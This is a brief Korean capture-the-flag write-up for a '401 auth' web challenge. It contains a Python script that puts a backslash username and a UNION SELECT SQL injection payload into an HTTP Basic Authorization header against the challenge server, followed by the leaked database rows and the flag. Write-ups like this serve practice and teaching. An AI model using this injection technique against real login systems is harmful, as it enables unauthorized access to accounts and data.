# [ch4n3 world] 401 auth - Writeup

HTTP Basic Authentication에 취약점이 있는줄 알고 삽질했는데 알고보니 SQL Injection 문제였다..

___

## Union Based SQL Injection

``` python
import urllib.parse, urllib.request
import base64

def main():
	id = '\\'
	pw = 'union select 1,0x61646D696E,3-- '

	url = 'http://13.124.1.51/web/prob14/'
	headers = {
		'User-Agent':'Mozilla/5.0',
		'Authorization':'Basic '+base64.b64encode((id+':'+pw).encode()).decode(),
		'Cookie':'PHPSESSID=920k80r5qm7135c3pbjqnemdu4'
	}

	req = urllib.request.Request(url, None, headers)
	res = urllib.request.urlopen(req).read().decode()

	print(res)

if __name__ == '__main__':
	main()
```
```
-- 생략 --
                <p>2909 | 123 | 123123123 | 2017-11-24</p>

            
                <p>2908 | 123123 | 123123 | 2017-11-24</p>

            
                <p>9999 | real_flag | flag{attack_detected_hello_hacker} | 9999-99-99</p>
```
___

## Answer

flag: `attack_detected_hello_hacker`